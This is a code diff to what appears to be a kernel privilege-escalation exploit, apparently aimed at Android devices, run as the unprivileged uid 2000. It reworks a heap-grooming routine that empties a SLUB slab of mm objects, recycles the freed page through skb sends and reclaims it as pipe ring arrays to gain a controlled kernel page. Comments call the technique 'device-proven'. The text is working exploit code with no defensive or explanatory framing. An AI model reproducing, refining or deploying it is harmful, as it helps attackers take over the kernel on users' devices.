@@ -92,12 +92,6 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
   ctx->memfds = calloc(sizeof(int), cnt);
 }
 
-static void pipe_child_release_ctx(struct mm_ctx *prep, void *buf) {
-  close_ctx_memfds(prep);
-  free_ctx_storage(prep);
-  free(buf);
-}
-
 /* fs/pipe-max-size / per-user pipe budget hardening (CZDE fixwave 2026-10):
  * F_SETPIPE_SZ above the sysctl (or past the per-user soft page budget)
  * fails EPERM for uid 2000 (CapEff=0). The old path discarded the SYSCHK
@@ -346,31 +340,28 @@ void free_pipe_object(int pipefd[2]) {
 }
 
 uintptr_t prepare_pipe_buffer_page_child(void) {
-  struct mm_ctx prep;
-  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
-
-  pin_to_core(CORE);
-  init_ctx(&prep, 32 * objs_per_slab);
-
-  for (size_t i = 0; i < prep.mm_cnt; i++) {
-    prep.childs[i] = -1;
-    prep.memfds[i] = clone_memfd();
-  }
-
   int group_fds[ORDER3_SIZE / MM_STRUCT_SZ];
   uintptr_t base = 0;
+  int dummy_sv[2];
+  struct controlled_mm_drain_state st = {
+      .s2 = -1,
+  };
+
+  pin_to_core(CORE);
   if (!collect_controlled_mm_group((size_t)sysconf(_SC_NPROCESSORS_ONLN),
                                    &base, group_fds)) {
-    pipe_child_release_ctx(&prep, NULL);
     return 0;
   }
   pr_info("pipe controlled page base=%016zx\n", base);
 
-  /* Intermediate grab, mirroring the device-proven util.c order: the 32 owned
-   * mm slots are freed, then 16 order-3 skb sends take the emptied slab's page
-   * and the skb close hands it straight back to the buddy (CPU pcp LIFO) so
-   * the ring pipe arrays get it as a fresh kmalloc-cgroup-2k slab. The emptied
-   * slab alone stays frozen+full in mm_cachep; it is never discarded. */
+  /* Device-proven free order (util.c prepare_controlled_kernel_page): the
+   * drain allocates S918_TRIGGER_SLABS*batch trigger memfds, closes 31 of the
+   * 32 owned mm fds, closes one trigger per trigger slab to create partial-slab
+   * pressure, then closes the last owned fd so SLUB discards the emptied slab
+   * instead of leaving it frozen on the per-CPU list where it was reused with
+   * inuse=32 obj=32 frozen=1. 16 order-3 skb sends then take the freed page and
+   * the skb close hands it back to the buddy (pcp LIFO), so the ring pipe
+   * arrays get it as a fresh kmalloc-cgroup-2k slab. */
   int skb_sv[2] = {-1, -1};
   if (socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv) != 0) {
     skb_sv[0] = -1;
@@ -394,22 +385,19 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     }
   }
 
-  for (size_t i = 0; i + 1 < ORDER3_SIZE / MM_STRUCT_SZ; ++i) {
-    SYSCHK(close(group_fds[i]));
-    group_fds[i] = -1;
-  }
-  for (size_t i = 0; i < prep.mm_cnt; i += objs_per_slab) {
-    if (prep.memfds[i] > 0) {
-      SYSCHK(close(prep.memfds[i]));
-      prep.memfds[i] = -1;
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, dummy_sv));
+  if (!drain_controlled_mm_group(group_fds, &st, dummy_sv)) {
+    release_controlled_mm_drain(&st);
+    if (skb_sv[0] >= 0) {
+      SYSCHK(close(skb_sv[0]));
     }
+    if (skb_sv[1] >= 0) {
+      SYSCHK(close(skb_sv[1]));
+    }
+    free(skb_page_buf);
+    return 0;
   }
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  SYSCHK(close(group_fds[ORDER3_SIZE / MM_STRUCT_SZ - 1]));
-  group_fds[ORDER3_SIZE / MM_STRUCT_SZ - 1] = -1;
+  release_controlled_mm_drain(&st);
 
   int reclaim_sent = 0;
   if (skb_page_buf) {
@@ -430,7 +418,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     if (alloc_pipe_object(pipe_fds_reclaim[i]) != 0) {
       pr_warning("p0 pipe ring alloc failed reclaim=%zu\n", i);
       free(skb_page_buf);
-      pipe_child_release_ctx(&prep, NULL);
       return 0;
     }
   }
@@ -466,7 +453,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   pr_info("pipe controlled page base=%016zx freed=%d sends=%d\n", base,
           (int)(ORDER3_SIZE / MM_STRUCT_SZ), reclaim_sent);
   free(skb_page_buf);
-  pipe_child_release_ctx(&prep, NULL);
   return base;
 }
 
